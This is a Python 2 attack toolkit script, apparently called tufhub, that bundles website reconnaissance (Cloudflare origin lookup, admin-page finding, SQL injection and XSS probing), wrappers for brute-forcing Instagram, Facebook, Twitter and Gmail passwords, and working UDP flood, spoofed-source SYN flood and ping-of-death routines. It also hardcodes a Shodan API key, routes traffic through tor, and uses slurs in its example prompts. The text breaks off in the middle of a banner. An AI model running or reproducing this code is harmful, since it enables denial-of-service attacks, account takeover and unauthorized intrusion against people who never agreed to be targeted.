#!/usr/local/bin/python
# coding: latin-1
from modules import *
import modules.colors
import builtwith
from urllib2 import Request, urlopen, URLError, HTTPError
from urllib import urlencode
from plugins.DNSDumpsterAPI import DNSDumpsterAPI
import whois
import json
from urlparse import urlparse
from re import search, sub
import cookielib
import socket
from scapy.all import *
from threading import Thread, active_count
import os
import random
import string
import signal
import ssl  
import argparse
import sys
import socks
import mechanize
import requests
import time
from datetime import datetime
now = datetime.now()
hour = now.hour
minute = now.minute
day = now.day
month = now.month
year = now.year
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
Gb = random._urandom(20000)
bytes = random._urandom(20000)
Kb = random._urandom(20000)
r = '\033[31m'
W = '\033[90m'
R = '\033[91m'
N = '\033[0m'
G = '\033[92m'
B = '\033[94m'
Y = '\033[93m'
LB = '\033[1;36m'
P = '\033[95m'
Bl = '\033[30m'
O = '\033[33m'
p = '\033[35m'
os.system("service tor start")
os.system("clear")

def striker():
  params = []
  # Browser
  br = mechanize.Browser()

  # Just some colors and shit
  white = '\033[1;97m'
  green = '\033[1;32m'
  red = '\033[1;31m'
  yellow = '\033[1;33m'
  end = '\033[1;m'
  info = '\033[1;33m[!]\033[1;m'
  que =  '\033[1;34m[?]\033[1;m'
  bad = '\033[1;31m[-]\033[1;m'
  good = '\033[1;32m[+]\033[1;m'
  run = '\033[1;97m[~]\033[1;m'

  # Cookie Jar
  cj = cookielib.LWPCookieJar()
  br.set_cookiejar(cj)

  # Browser options
  br.set_handle_equiv(True)
  br.set_handle_redirect(True)
  br.set_handle_referer(True)
  br.set_handle_robots(False)

  # Follows refresh 0 but not hangs on refresh > 0
  br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(), max_time=1)
  br.addheaders = [
      ('User-agent', 'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.1) Gecko/2008071615 Fedora/3.0.1-1.fc9 Firefox/3.0.1')]


  print '''\033[1;31m
     _________ __          __ __
    /   _____//  |________|__|  | __ ___________
    \_____  \\\\   __\_  __ \  |  |/ // __ \_  __ \\
    /        \|  |  |  | \/  |    <\  ___/|  | \/
   /_______  /|__|  |__|  |__|__|_ \\\\___  >__|
           \/                     \/    \/\033[1;m'''
  target = raw_input('\033[1;34m[?]\033[1;m Enter the target: ')
  if 'http' in target:
      parsed_uri = urlparse(target)
      domain = '{uri.netloc}'.format(uri=parsed_uri)
  else:
      domain = target
      try:
          br.open('http://' + target)
          target = 'http://' + target
      except:
          target = 'https://' + target

  def sqli(url):
      print '%s Using SQLMap api to check for SQL injection vulnerabilities. Don\'t worry we are using an online service and it doesn\'t depend on your internet connection. This scan will take 2-3 minutes.' % run
      br.open('https://suip.biz/?act=sqlmap')
      br.select_form(nr=0)
      br.form['url'] = url
      req = br.submit()
      result = req.read()
      match = search(r"---(?s).*---", result)
      if match:
          print '%s One or more parameters are vulnerable to SQL injection' % good
          option = raw_input(
              '%s Would you like to see the whole report? [Y/n] ' % que).lower()
          if option == 'n':
              pass
          else:
              print '\033[1;31m-\033[1;m' * 40
              print match.group().split('---')[1][:-3]
              print '\033[1;31m-\033[1;m' * 40
      else:
          print '%s None of parameters is vulnerable to SQL injection' % bad


  def cms(domain):
      try:
          result = br.open('https://whatcms.org/?s=' + domain).read()
          detect = search(r'class="nowrap" title="[^<]*">', result)
          WordPress = False
          try:
              r = br.open(target + '/robots.txt').read()
              if "wp-admin" in str(r):
                  WordPress = True
          except:
              pass
          if detect:
              print '%s CMS Detected : %s' % (info, detect.group().split('class="nowrap" title="')[1][:-2])
              detect = detect.group().split('">')[1][:-27]
              if 'WordPress' in detect:
                  option = raw_input(
                      '%s Would you like to use WPScan? [Y/n] ' % que).lower()
                  if option == 'n':
                      pass
                  else:
                      os.system('wpscan --random-agent --url %s' % domain)
          elif WordPress:
              print '%s CMS Detected : WordPress' % info
              option = raw_input(
                  '%s Would you like to use WPScan? [Y/n] ' % que).lower()
              if option == 'n':
                  pass
              else:
                  os.system('wpscan --random-agent --url %s' % domain)
          else:
              print '%s %s doesn\'t seem to use a CMS' % (info, domain)
      except:
          pass

  def honeypot(ip_addr):
      result = {"0.0": 0, "0.1": 10, "0.2": 20, "0.3": 30, "0.4": 40, "0.5": 50, "0.6": 60, "0.7": 70, "0.8": 80, "0.9": 90, "1.0": 10}
      honey = 'https://api.shodan.io/labs/honeyscore/%s?key=C23OXE0bVMrul2YeqcL7zxb6jZ4pj2by' % ip_addr
      try:
          phoney = br.open(honey).read()
          if float(phoney) >= 0.0 and float(phoney) <= 0.4:
              what = good
          else:
              what = bad
          print '{} Honeypot Probabilty: {}%'.format(what, result[phoney])
      except KeyError:
          print '\033[1;31m[-]\033[1;m Honeypot prediction failed'

  def whoisIt(url):
      who = ""
      print '{} Trying to gather whois information for {}'.format(run,url)
      try:
          who = str(whois.whois(url)).decode()
      except Exception:
          pass
      test = who.lower()
      if "whoisguard" in test or "protection" in test or "protected" in test:
          print '{} Whois Protection Enabled{}'.format(bad, end)
      else:
          print '{} Whois information found{}'.format(good, end)
          try:
              data = json.loads(who)
              for key in data.keys():
                  print "{} :".format(key.replace("_", " ").title()),
                  if type(data[key]) == list:
                      print ", ".join(data[key])
                  else:
                      print "{}".format(data[key])
          except ValueError:
              print '{} Unable to build response, visit https://who.is/whois/{} {}'.format(bad, url, end) 
      pass

  def nmap(ip_addr):
      port = 'http://api.hackertarget.com/nmap/?q=' + ip_addr
      result = br.open(port).read()
      result = sub(r'Starting[^<]*\)\.', '', result)
      result = sub(r'Service[^<]*seconds', '', result)
      result = os.linesep.join([s for s in result.splitlines() if s])
      print result

  def bypass(domain):
      post = urlencode({'cfS': domain})
      result = br.open(
          'http://www.crimeflare.info/cgi-bin/cfsearch.cgi ', post).read()

      match = search(r' \b\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}\b', result)
      if match:
          bypass.ip_addr = match.group().split(' ')[1][:-1]
          print '%s Real IP Address : %s' % (good, bypass.ip_addr)

  def dnsdump(domain):
      res = DNSDumpsterAPI(False).search(domain)
      print '\n%s DNS Records' % good
      for entry in res['dns_records']['dns']:
          print '{domain} ({ip}) {as} {provider} {country}'.format(**entry)
      for entry in res['dns_records']['mx']:
          print '\n%s MX Records' % good
          print '{domain} ({ip}) {as} {provider} {country}'.format(**entry)
      print '\n\033[1;32m[+]\033[1;m Host Records (A)'
      for entry in res['dns_records']['host']:
          if entry['reverse_dns']:
              print '{domain} ({reverse_dns}) ({ip}) {as} {provider} {country}'.format(**entry)
          else:
              print '{domain} ({ip}) {as} {provider} {country}'.format(**entry)
      print '\n%s TXT Records' % good
      for entry in res['dns_records']['txt']:
          print entry
      print '\n%s DNS Map: https://dnsdumpster.com/static/map/%s.png\n' % (good, domain.strip('www.'))


  def fingerprint(ip_addr):
      try:
          result = br.open('https://www.censys.io/ipv4/%s/raw' % ip_addr).read()
          match = search(r'&#34;os_description&#34;: &#34;[^<]*&#34;', result)
          if match:
              print '%s Operating System : %s' % (good, match.group().split('n&#34;: &#34;')[1][:-5])
      except:
          pass


  ip_addr = socket.gethostbyname(domain)
  print '%s IP Address : %s' % (info, ip_addr)
  try:
      r = requests.get(target)
      header = r.headers['Server']
      if 'cloudflare' in header:
          print '%s Cloudflare detected' % bad
          bypass(domain)
          try:
              ip_addr = bypass.ip_addr
          except:
              pass
      else:
          print '%s Server: %s' % (info, header)
      try:
          print '%s Powered By: %s' % (info, r.headers['X-Powered-By'])
      except:
          pass
      try:
          r.headers['X-Frame-Options']
      except:
          print '%s Clickjacking protection is not in place.' % good
  except:
      pass
  fingerprint(ip_addr)
  cms(domain)
  try:
      honeypot(ip_addr)
  except:
      pass
  print "{}----------------------------------------{}".format(red, end)
  whoisIt(domain)
  try:
      r = br.open(target + '/robots.txt').read()
      print '\033[1;31m-\033[1;m' * 40
      print '%s Robots.txt retrieved\n' % good, r
  except:
      pass
  print '\033[1;31m-\033[1;m' * 40
  nmap(ip_addr)
  print '\033[1;31m-\033[1;m' * 40
  dnsdump(domain)
  os.system('cd plugins && python theHarvester.py -d %s -b all' % domain)
  try:
      br.open(target)
      print '%s Crawling the target for fuzzable URLs' % run
      for link in br.links():
          if 'http' in link.url or '=' not in link.url:
              pass
          else:
              url = target + '/' + link.url
              params.append(url)
      if len(params) == 0:
          print '%s No fuzzable URLs found' % bad
          quit()
      print '%s Found %i fuzzable URLs' % (good, len(params))
      for url in params:
          print url
          sqli(url)
          url = url.replace('=', '<svg/onload=alert()>')
          r = br.open(url).read()
          if '<svg/onload=alert()>' in r:
              print '%s One or more parameters are vulnerable to XSS' % good
          break
      print '%s These are the URLs having parameters:' % good
      for url in params:
          print url
  except:
      pass

def webkiller():
  while True:

      os.system('clear')
      print(Banner)
      print '\r'



      def reverseHackTarget(website):
          website = addHTTP(website)
          webs = removeHTTP(website)
          url = "http://api.hackertarget.com/reverseiplookup/?q="
          combo = "{url}{website}".format(url=url, website=webs)
          request = requests.get(combo, headers=functions._headers, timeout=5).text.encode('UTF-8')
          if len(request) != 5:
              list = request.strip("").split("\n")
              for _links in list:
                  if len(_links) != 0:
                      write(var="+", color=w, data=_links)
          else:
              write(var="@", color=r, data="Sorry, The webserver of the website you entered have no domains other then the one you gave :')")


      def reverseYouGetSignal(website):
          website = addHTTP(website)
          webs = removeHTTP(website)
          url = "https://domains.yougetsignal.com/domains.php"
          post = {
              'remoteAddress' : webs,
              'key' : ''
          }
          request = requests.post(url, headers=functions._headers, timeout=5, data=post).text.encode('UTF-8')

          grab = json.loads(request)

          Status = grab['status']
          IP = grab['remoteIpAddress']
          Domain = grab['remoteAddress']
          Total_Domains = grab['domainCount']
          Array = grab['domainArray']

          if (Status == 'Fail'):
              write(var="+", color=r, data="Sorry! Reverse Ip Limit Reached.")
          else:
              write(var="*", color=c, data="IP: " + IP + "")
              write(var="*", color=c, data="Domain: " + Domain + "")
              write(var="*", color=c, data="Total Domains: " + Total_Domains + "\n")

              domains = []

              for x, y in Array:
                  domains.append(x)

              for res in domains:
                  write(var="+", color=w, data=res)


      def geoip(website):
          website = addHTTP(website)
          webs = removeHTTP(website)
          url = "http://api.hackertarget.com/geoip/?q="
          combo = "{url}{website}".format(url=url, website=webs)
          request = requests.get(combo, headers=functions._headers, timeout=5).text.encode('UTF-8')
          if len(request) != 5:
              list = request.strip("").split("\n")
              for _links in list:
                  if len(_links) != 0:
                      write(var="+", color=w, data=_links)
          else:
              write(var="@", color=r, data="Sorry, The webserver of the website you entered have no domains other then the one you gave :')")



      def httpheaders(website):
          website = addHTTP(website)
          webs = removeHTTP(website)
          url = "http://api.hackertarget.com/httpheaders/?q="
          combo = "{url}{website}".format(url=url, website=webs)
          request = requests.get(combo, headers=functions._headers, timeout=5).text.encode('UTF-8')
          if len(request) != 5:
              list = request.strip("").split("\n")
              for _links in list:
                  if len(_links) != 0:
                      write(var="+", color=w, data=_links)
          else:
              write(var="@", color=r, data="Sorry, The webserver of the website you entered have no domains other then the one you gave :')")


      def cloudflare(website):
          subdomainlist = ["ftp", "cpanel", "webmail", "localhost", "local", "mysql", "forum", "driect-connect", "blog",
                           "vb", "forums", "home", "direct", "forums", "mail", "access", "admin", "administrator",
                           "email", "downloads", "ssh", "owa", "bbs", "webmin", "paralel", "parallels", "www0", "www",
                           "www1", "www2", "www3", "www4", "www5", "shop", "api", "blogs", "test", "mx1", "cdn", "mysql",
                           "mail1", "secure", "server", "ns1", "ns2", "smtp", "vpn", "m", "mail2", "postal", "support",
                           "web", "dev"]

          for sublist in subdomainlist:
              try:
                  hosts = str(sublist) + "." + str(website)
                  showip = socket.gethostbyname(str(hosts))
                  print "[!] CloudFlare Bypass " + str(showip) + ' | ' + str(hosts)
              except:
                  write(var="@", color=r,data="Sorry, The webserver of the website you entered have no domains other then the one you gave :')")


      def whois(website):
          website = addHTTP(website)
          webs = removeHTTP(website)
          url = "http://api.hackertarget.com/whois/?q="
          combo = "{url}{website}".format(url=url, website=webs)
          request = requests.get(combo, headers=functions._headers, timeout=5).text.encode('UTF-8')
          if len(request) != 5:
              list = request.strip("").split("\n")
              for _links in list:
                  if len(_links) != 0:
                      write(var="+", color=w, data=_links)
          else:
              write(var="@", color=r, data="Sorry, The webserver of the website you entered have no domains other then the one you gave :')")


      def dnslookup(website):
          website = addHTTP(website)
          webs = removeHTTP(website)
          url = "http://api.hackertarget.com/dnslookup/?q="
          combo = "{url}{website}".format(url=url, website=webs)
          request = requests.get(combo, headers=functions._headers, timeout=5).text.encode('UTF-8')
          if len(request) != 5:
              list = request.strip("").split("\n")
              for _links in list:
                  if len(_links) != 0:
                      write(var="+", color=w, data=_links)
          else:
              write(var="@", color=r, data="Sorry, The webserver of the website you entered have no domains other then the one you gave :')")


      def findshareddns(website):
          website = addHTTP(website)
          webs = removeHTTP(website)
          url = "http://api.hackertarget.com/findshareddns/?q="
          combo = "{url}{website}".format(url=url, website=webs)
          request = requests.get(combo, headers=functions._headers, timeout=5).text.encode('UTF-8')
          if len(request) != 5:
              list = request.strip("").split("\n")
              for _links in list:
                  if len(_links) != 0:
                      write(var="+", color=w, data=_links)
          else:
              write(var="@", color=r, data="Sorry, The webserver of the website you entered have no domains other then the one you gave :')")


      def heading(heading, website, color, afterWebHead):
          space = " " * 10
          var = str(heading + " '" + website + "'" + str(afterWebHead))
          length = len(var) + 1; print "" # \n
          print("\n\n{color}" + var).format(color=color)
          print("{white}" + "-" * length + "--").format(white=w); print "" # \n


      def fetch(url, decoding='utf-8'):
          return urlopen(url).read().decode(decoding)


      def portchacker(domain):
          try:
              port = "http://api.hackertarget.com/nmap/?q=" + domain
              pport = fetch(port)
              print (pport)
          except:
              write(var="@", color=r, data="Sorry, The webserver of the website you entered have no domains other then the one you gave ")


      def CmsScan(website):

          try:
              website = addHTTP(website)
              webs = removeHTTP(website)
              w = builtwith.builtwith(website)

              print "[+] Cms : " , w["cms"][0]
              print "[+] Web Servers : " , w["web-servers"][0]
              print "[+] Programming Languages : " , w["programming-languages"][0]
              print "\n"
          except:
              write(var="@", color=r,data="Sorry, The webserver of the website you entered have no domains other then the one you gave ")


      def RobotTxt(domain):

          if not (domain.startswith('http://') or domain.startswith('https://')):
              domain = 'http://' + domain
          robot = domain + "/robots.txt"
          try:
              probot = fetch(robot)
              print(probot)
          except URLError:
              write(var="@", color=r, data="Sorry, The webserver of the website you entered have no domains other then the one you gave ")


      def PageAdminFinder(link):
          f = open("admin.txt","r")
          print "\n\nAvilable Links : \n"
          while True:
              sub_link = f.readline()
              if not sub_link:
                  break
              req_link = "http://" + link + "/" + sub_link
              req = Request(req_link)
              try:
                  response = urlopen(req)
              except HTTPError as e:
                  continue
              except URLError as e:
                  break
                  write(var="@", color=r, data="Sorry, The webserver of the website you entered have no domains other then the one you gave ")
              else:
                  print "Find Page >> ", req_link


      def Traceroute(website):
          try:
              port = "https://api.hackertarget.com/mtr/?q=" + website
              pport = fetch(port)
              print (pport)
          except:
              write(var="@", color=r, data="Sorry, The webserver of the website you entered have no domains other then the one you gave ")


      def HoneypotDetector(ipaddress):
          honey = "https://api.shodan.io/labs/honeyscore/" + ipaddress + "?key=C23OXE0bVMrul2YeqcL7zxb6jZ4pj2by"

          try:
              phoney = fetch(honey)

          except URLError:
              phoney = None
              write(var="@", color=r, data="Sorry, The webserver of the website you entered have no domains other then the one you gave ")

          if phoney:
              print('Honeypot Percent : {probability}'.format(
                  color='2' if float(phoney) < 0.5 else '3', probability=float(phoney) * 10))
              print "\n"



      def ping(website):
          try:
              port = "http://api.hackertarget.com/nping/?q=" + website
              pport = fetch(port)
              print (pport)
          except:
              write(var="@", color=r, data="Sorry, The webserver of the website you entered have no domains other then the one you gave ")


      print b + """
      1 - Reverse IP With HackTarget
      2 - Reverse IP With YouGetSignal
      3 - Geo IP Lookup
      4 - Whois
      5 - Bypass CloudFlare
      6 - DNS Lookup
      7 - Find Shared DNS
      8 - Show HTTP Header
      9 - Port Scan
      10 - CMS Scan
      11 - Page Admin Finder
      12 - Robots.txt
      13 - Traceroute
      14 - Honeypot Detector
      15 - Ping
      16 - All
      17 - Exit
      
      """

      EnterApp = raw_input("Enter : ")



      if EnterApp == "1":
          m = raw_input("Enter Address Website = ")
          heading(heading="Reversing IP With HackTarget", color=c, website=m, afterWebHead="")
          reverseHackTarget(m)
          print "\n"
          raw_input("[*] Back To Menu (Press Enter...) ")


      elif EnterApp == "2":
          m = raw_input("Enter Address Website = ")
          heading(heading="Reverse IP With YouGetSignal", color=c, website=m, afterWebHead="")
          reverseYouGetSignal(m)
          print "\n"
          raw_input("[*] Back To Menu (Press Enter...) ")


      elif EnterApp == "3":
          m = raw_input("Enter Address Website = ")
          heading(heading="Geo IP Lookup", color=c, website=m, afterWebHead="")
          geoip(m)
          print "\n"
          raw_input("[*] Back To Menu (Press Enter...) ")


      elif EnterApp == "4":
          m = raw_input("Enter Address Website = ")
          heading(heading="Whois", color=c, website=m, afterWebHead="")
          whois(m)
          print "\n"
          raw_input("[*] Back To Menu (Press Enter...) ")


      elif EnterApp == "5":
          m = raw_input("Enter Address Website = ")
          heading(heading="Bypass Cloudflare", color=c, website=m, afterWebHead="")
          cloudflare(m)
          print "\n"
          raw_input("[*] Back To Menu (Press Enter...) ")


      elif EnterApp == "6":
          m = raw_input("Enter Address Website = ")
          heading(heading="DNS Lookup", color=c, website=m, afterWebHead="")
          dnslookup(m)
          print "\n"
          raw_input("[*] Back To Menu (Press Enter...) ")


      elif EnterApp == "7":
          m = raw_input("Enter Address Website = ")
          heading(heading="Find Shared DNS", color=c, website=m, afterWebHead="")
          findshareddns(m)
          print "\n"
          raw_input("[*] Back To Menu (Press Enter...) ")


      elif EnterApp == "8":
          m = raw_input("Enter Address Website = ")
          heading(heading="Show HTTP Header", color=c, website=m, afterWebHead="")
          httpheaders(m)
          print "\n"
          raw_input("[*] Back To Menu (Press Enter...) ")


      elif EnterApp == "9":
          m = raw_input("Enter Address Website = ")
          heading(heading="PortChacker", color=c, website=m, afterWebHead="")
          portchacker(m)
          print "\n"
          raw_input("[*] Back To Menu (Press Enter...) ")



      elif EnterApp == "10":
          m = raw_input("Enter Address Website = ")
          heading(heading="CMS Scan", color=c, website=m, afterWebHead="")
          CmsScan(m)
          print "\n"
          raw_input("[*] Back To Menu (Press Enter...) ")



      elif EnterApp == "11":
          m = raw_input("Enter Address Website = ")
          heading(heading="Page Admin Finder", color=c, website=m, afterWebHead="")
          PageAdminFinder(m)
          print "\n"
          raw_input("[*] Back To Menu (Press Enter...) ")


          

      elif EnterApp == "12":
          m = raw_input("Enter Address Website = ")
          heading(heading="Robot.txt", color=c, website=m, afterWebHead="")
          RobotTxt(m)
          raw_input("[*] Back To Menu (Press Enter...) ")



      elif EnterApp == "13":
          m = raw_input("Enter Address Website = ")
          heading(heading="Traceroute", color=c , website=m , afterWebHead="")
          Traceroute(m)
          print "\n"
          raw_input("[*] Back To Menu (Press Enter...) ")


      elif EnterApp == "14":
          m = raw_input("Enter (IP) Address = ")
          heading(heading="Honeypot Detector", color=c , website=m , afterWebHead="")
          HoneypotDetector(m)
          print "\n"
          raw_input("[*] Back To Menu (Press Enter...) ")



      elif EnterApp == "15":
          m = raw_input("Enter Address Website = ")
          heading(heading="Ping", color=c , website=m , afterWebHead="")
          ping(m)
          print "\n"
          raw_input("[*] Back To Menu (Press Enter...) ")


      elif EnterApp == "16":

          m = raw_input("Enter Address Website = ")

          heading(heading="Reversing IP With HackTarget", color=c, website=m, afterWebHead="")
          reverseHackTarget(m)

          heading(heading="Reverse IP With YouGetSignal", color=c, website=m, afterWebHead="")
          reverseYouGetSignal(m)

          heading(heading="Geo IP Lookup", color=c, website=m, afterWebHead="")
          geoip(m)

          heading(heading="Whois", color=c, website=m, afterWebHead="")
          whois(m)

          heading(heading="Bypass Cloudflare", color=c, website=m, afterWebHead="")
          cloudflare(m)

          heading(heading="DNS Lookup", color=c, website=m, afterWebHead="")
          dnslookup(m)

          heading(heading="Find Shared DNS", color=c, website=m, afterWebHead="")
          findshareddns(m)

          heading(heading="Show HTTP Header", color=c, website=m, afterWebHead="")
          httpheaders(m)

          heading(heading="Port Scan", color=c, website=m, afterWebHead="")
          portchacker(m)

          heading(heading="Cms Scan", color=c, website=m, afterWebHead="")
          CmsScan(m)

          heading(heading="Robot.txt", color=c, website=m, afterWebHead="")
          RobotTxt(m)

          heading(heading="Traceroute", color=c , website=m , afterWebHead="")
          Traceroute(m)

          heading(heading="Ping", color=c , website=m , afterWebHead="")
          ping(m)

          heading(heading="Page Admin Finder", color=c, website=m, afterWebHead="")
          PageAdminFinder(m)
          
          print "\n"
          raw_input("[*] Back To Menu (Press Enter...) ")


      elif EnterApp == "17":
          print "\n"
          break


      else:
          print "[!] Please Enter a Number"
          raw_input("[*] Back To Menu (Press Enter...) ")



def redhawk():
  os.system("php /root/tufhub/redhawk/rhawk.php")

def portscan():
  port = raw_input("Target> ")
  os.system("nmap " + port)

def instagram():
  print "Type username wordlist threads    Example: --> unkn0wn_bali wordlist.txt 60"
  insta = raw_input("--> ")
  os.system("python /root/tufhub/password/instagram.py " + insta)

def hydra():
  print "Example: -l faggot@gmail.com -s 465 -S -v -V -P gmailcrack.txt -t 32  [!dont type hydra just type arguments!]"
  hydra = raw_input("[HYDRA]$ ")
  os.system("hydra " + hydra)

def twitter():
  os.system("cd /root/tufhub/password && chmod +x /root/tufhub/password * && sh /root/tufhub/password/tweetshell.sh")

def facebook():
  print "Type Email / ID  Wordlist    Example: [FACEBOOK->]: nigga.andrew777 facelist.txt"
  facebook = raw_input("[FACEBOOK->]: ")
  os.system("cd password && perl fb-brute.pl " + facebook)

def udp():
  target = raw_input(R+"[Target] \033[0m$ ")
  ip = socket.gethostbyname(target)
  port = input(R+"[Port] \033[0m$ ")
  os.system("service tor restart")
  print N+"udp attack started on {0}.{1} | {2}-{3}-{4}".format(hour, minute, day, month, year)
  os.system("sleep 2s")
  sent = 0
  print "KILLING %s CONNECTIONS"%(ip)           
  while True:
    sock.sendto(Gb, (ip,port))
    sock.sendto(bytes, (ip,port))
    sock.sendto(Kb, (ip,port))
    sent = sent + 1
    port = port + 1
    print N+"|+| Slapping |\033[31m %s \033[0m| Port |\033[31m %s \033[0m| Bytes |\033[31m %s \033[0m|"%(ip,port,sent)
    if port == 65534:
      port = 1
      port = 1

def syn():
  def randomIP():
    ip = ".".join(map(str, (random.randint(0,255)for _ in range(4))))
    return ip

  def randInt():
    x = random.randint(1000,9000)
    return x  

  def SYN_Flood(dstIP,dstPort,counter):
    total = 0
    print "Packets are sending ..."
    for x in range (0,counter):
      s_port = randInt()
      s_eq = randInt()
      w_indow = randInt()

      IP_Packet = IP ()
      IP_Packet.src = randomIP()
      IP_Packet.dst = dstIP

      TCP_Packet = TCP () 
      TCP_Packet.sport = s_port
      TCP_Packet.dport = dstPort
      TCP_Packet.flags = "S"
      TCP_Packet.seq = s_eq
      TCP_Packet.window = w_indow

      send(IP_Packet/TCP_Packet, verbose=0)
      total+=1
    sys.stdout.write("\nTotal packets sent: %i\n" % total)


  def info():

    dstIP = raw_input ("\nTarget IP : ")
    dstPort = input ("Target Port : ")
    
    return dstIP,int(dstPort)
    

  def main():
    dstIP,dstPort = info()
    counter = input ("Packets : ")
    SYN_Flood(dstIP,dstPort,int(counter))

  main()

def pod():
  pod = raw_input("Enter Target: ")
  ip = socket.gethostbyname(pod)
  while True:
    os.system("ping -n -l 60000 " + ip)
    os.system("ping -n -l 60000 " + ip)
    os.system("ping -n -l 60000 " + ip)
    os.system("ping -n -l 60000 " + ip)
    os.system("ping -n -l 60000 " + ip)
    os.system("ping -n -l 60000 " + ip)
    os.system("ping -n -l 60000 " + ip)
    os.system("ping -n -l 60000 " + ip)
    os.system("ping -n -l 60000 " + ip)
def tcp():
  print N+"Example: tcp 10.63.25.2 -p 80 -t 4000"
  print N+"      -p = port   -t = threads"
  tcp = raw_input("|TCP|--> ")
  os.system("python " + tcp)
def help():
  print G+"-" * 100
  print r+"[1]  Stress Testing"
  print "[2]  Exploits"
  print "[3]  Info Gather"
  print "[4]  Tool Installer  #!: (just installs new tools doesnt run them)"
  print "[5]  Password Attacks"
  print "[6]  Wireless"
  print G+"-" * 100
def mainbanner():
  print N+"""
                                           :PB@Bk:                        
                                       ,jB@@B@B@B@BBL.                    
                                    7G@B@B@BMMMMMB@B@B@Nr                  
                                :kB@B@@@MMOMOMOMOMMMM@B@B@B1,              
                            :5@B@B@B@BBMMOMOMOMOMOMOMM@@@B@B@BBu.          
                         70@@@B@B@B@BXBBOMOMOMOMOMOMMBMPB@B@B@B@B@Nr      
                       G@@@BJ iB@B@@  OBMOMOMOMOMOMOM@2  B@B@B. EB@B@S    
                       @@BM@GJBU.  iSuB@OMOMOMOMOMOMM@OU1:  .kBLM@M@B@    
                       B@MMB@B       7@BBMMOMOMOMOMOBB@:       B@BMM@B    
                       @@@B@B    T    7@@@MMOMOMOMM@B@:    T    @@B@B@    
                       @@OLB.    |     BNB@MMOMOMM@BEB     |    rBjM@B\033[90m    
                       @@  @-----U-----M  OBOMOMM@q  M-----U----.@  @@    
                       @@OvB     |     B:u@MMOMOMMBJiB     |    .BvM@B    
                       @B@B@J    F    0@B@MMOMOMOMB@B@u    F    q@@@B@    
                       B@MBB@v       G@@BMMMMMMMMMMMBB@5       F@BMM@B    
                       @BBM@BPNi   LMEB@OMMMM@B@MMOMM@BZM7   rEqB@MBB@    
                       B@@@BM  B@B@B  qBMOMB@B@B@BMOMBL  B@B@B  @B@B@M    
                        J@@@@PB@B@B@B7G@OMBB.   ,@MMM@qLB@B@@@BqB@BBv      
                           iGB@,i0@M@B@MMO@E  :  M@OMM@@@B@Pii@@N:        
                              .   B@M@B@MMM@B@B@B@MMM@@@M@B                
                                  @B@B.i@MBB@B@B@@BM@::B@B@                
                                  B@@@ .B@B.:@B@ :B@B  @B@O                
                                    :0 r@B@  B@@ .@B@: P:\033[0m        Created By \033[92m@unkn0wn_bali \033[0mOn Instagram\033[90m                  
                                        vMB :@B@ :BO7                      
                                            \033[90m,B@B\033[92m                           Type "?" for help\033[0m
\n      
  """
mainbanner()
help()
def stressbanner():
  print '''
 ▐██▌   ██████ ▄▄▄█████\033[91m▓\033[0m ██▀███  \033[91m▓\033[0m█████   ██████   ██████  ▐██▌ 
 ▐██▌ \033[91m▒\033[0m██\033[91m    ▒ ▓  \033[0m██\033[91m▒ ▓▒▓\033[0m██\033[91m ▒ \033[0m██\033[91m▒▓\033[0m█   ▀ \033[91m▒\033[0m██    \033[91m▒ ▒\033[0m██   \033[91m ▒  \033[0m▐██▌ 
 ▐██▌\033[91m ░ ▓\033[0m██▄\033[91m   ▒ ▓\033[0m██\033[91m░ ▒░▓\033[0m██ \033[91m░\033[0m▄█ \033[91m▒▒\033[0m███   \033[91m░ ▓\033[0m██▄   \033[91m░ ▓\033[0m██▄    ▐██▌ 
 \033[91m▓\033[0m██\033[91m▒   ▒   \033[0m██\033[91m▒░ ▓\033[0m██\033[91m▓ ░ ▒\033[0m██▀▀█▄  \033[91m▒▓\033[0m█  ▄   \033[91m▒   \033[0m██\033[91m▒  ▒   \033[0m██\033[91m▒ ▓\033[0m██\033[91m▒ 
 ▒\033[0m▄▄  \033[91m▒\033[0m██████\033[91m▒▒  ▒\033[0m██\033[91m▒ ░ ░\033[0m██\033[91m▓ ▒\033[0m██\033[91m▒░▒\033[0m████\033[91m▒▒\033[0m██████\033[91m▒▒▒\033[0m██████\033[91m▒▒ ▒\033[0m▄▄\033[91m  
 ░\033[0m▀▀\033[91m▒ ▒ ▒▓▒ ▒ ░  ▒ ░░   ░ ▒▓ ░▒▓░░░ ▒░ ░▒ ▒▓▒ ▒ ░▒ ▒▓▒ ▒ ░ ░\033[0m▀▀\033[91m▒ 
 ░  ░ ░ ░▒  ░ ░    ░      ░▒ ░ ▒░ ░ ░  ░░ ░▒  ░ ░░ ░▒  ░ ░ ░  ░ 
    ░ ░  ░  ░    ░        ░░   ░    ░   ░  ░  ░  ░  ░  ░      ░ 
 ░          ░              ░        ░  ░      ░        ░   ░                  
  '''.decode('utf-8')
  print "\n"
def stress():
  stressbanner()
  print G+"-" * 100
  print r+"[1]  udp flood"
  print "[2]  tcp flood"
  print "[3]  syn flood"
  print "[4]  ping of death"
  print G+"-" * 100
  stress = raw_input("[Stress] \033[94m->: \033[0m")
  if stress == "1" :
    udp()
  if stress == "2" :
    tcp()
  if stress == "3" :
    syn()
  if stress == "4" :
    pod()
  if stress == "menu" :
    os.system("clear")
    mainbanner()
  else:
    print r+"no option called ", R+stress
    os.system("sleep 2")
    os.system("clear")
    mainbanner()
def exploitbanner():
  print p+'''
███████\033[0m╗\033[35m██\033[0m╗  \033[35m██\033[0m╗\033[35m██████\033[0m╗ \033[35m██\033[0m╗      \033[35m██████\033[0m╗ \033[35m██\033[0m╗\033[35m████████\033[0m╗
\033[35m██\033[0m╔════╝╚\033[35m██\033[0m╗\033[35m██\033[0m╔╝\033[35m██\033[0m╔══\033[35m██\033[0m╗\033[35m██\033[0m║     \033[35m██\033[0m╔═══\033[35m██\033[0m╗\033[35m██\033[0m║╚══\033[35m██\033[0m╔══╝
\033[35m█████\033[0m╗   ╚\033[35m███\033[0m╔╝ \033[35m██████\033[0m╔╝\033[35m██\033[0m║     \033[35m██\033[0m║   \033[35m██\033[0m║\033[35m██\033[0m║   \033[35m██\033[0m║
\033[35m██\033[0m╔══╝   \033[35m██\033[0m╔\033[35m██\033[0m╗ \033[35m██\033[0m╔═══╝ \033[35m██\033[0m║     \033[35m██\033[0m║   \033[35m██\033[0m║\033[35m██\033[0m║   \033[35m██\033[0m║   
